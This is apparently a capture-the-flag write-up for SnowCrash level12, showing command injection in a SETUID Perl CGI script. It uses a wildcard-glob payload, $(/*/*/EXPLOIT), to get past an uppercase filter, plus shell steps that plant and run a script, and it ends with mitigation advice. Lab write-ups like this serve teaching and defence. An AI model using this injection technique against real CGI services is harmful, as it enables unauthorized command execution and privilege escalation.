## 📄 Description

The vulnerable Perl CGI script takes two parameters (x and y) and runs egrep "^$x" using backticks, allowing command injection. However, x is converted to uppercase and truncated at the first space, preventing direct injection of commands like `getflag`.

To bypass this, we place a malicious script in a path with only uppercase-safe characters (e.g., /dev/shm/EXPLOIT), make it executable, and trigger it using wildcard globbing. This script captures the flag and writes it to a readable file.

## 🧩 Challenge Overview

- The `level12.pl` script is a **SETUID** executable owned by `flag12`, allowing privilege escalation if exploited:
```
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
```

- The script runs a `CGI` service `locally` on port `4646`, serving requests only from `localhost`:
```
level12@SnowCrash:~$ cat level12.pl 
#!/usr/bin/env perl
# localhost:4646
[...]
```

- The script uses Perl's `CGI` module with `param`, which is the standard way to read `HTTP request parameters` (GET or POST) in a CGI script:
```
level12@SnowCrash:~$ cat level12.pl 
[...]
use CGI qw{param};
[...]
```

- The call `param("x")` and `param("y")` clearly shows the script expects two parameters named `x` and `y`.
```
level12@SnowCrash:~$ cat level12.pl 
[...]
n(t(param("x"), param("y")));
```

- The script Converts `x` to **uppercase** and **removes** everything after the `first space`:
```
level12@SnowCrash:~$ cat level12.pl 
[...]
$xx = $_[0];         # $xx gets the value of param("x")
$xx =~ tr/a-z/A-Z/;  # Converts all lowercase letters to uppercase
$xx =~ s/\s.*//;     # Removes everything from the first whitespace onward
[...]
```

- The script uses `backticks` to execute shell commands:
```
level12@SnowCrash:~$ cat level12.pl
[...]
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
[...]
```

## ⚔️ Exploitation Strategy

- Write a script (`EXPLOIT`) containing the `getflag` command to a known, executable location (`e.g., /dev/shm/EXPLOIT`):
```
level12@SnowCrash:~$ cat << EOF > /dev/shm/EXPLOIT
> #!/bin/sh
> getflag > /tmp/result
> EOF
```

- Ensure the script is executable :
```
level12@SnowCrash:~$ chmod +x /dev/shm/EXPLOIT
```

- Visit this URL in a web browser to trigger the CGI script and execute the EXPLOIT script:
```
http://${VM_IP}:4646/?x="$(/*/*/EXPLOIT)"
```

## ✅ Result

- Read the flag stored in /tmp/result:
```
level11@SnowCrash:~$ cat /tmp/result
Check flag.Here is your token : 
```

## 🛡️ Mitigation Advice

- Avoid `direct` concatenation of user input into shell commands to prevent **injection vulnerabilities**.
- Implement `rigorous input validation` and `strict filtering mechanisms`.
- Remove the `SUID` bit from scripts unless absolutely necessary to minimize privilege escalation risks.
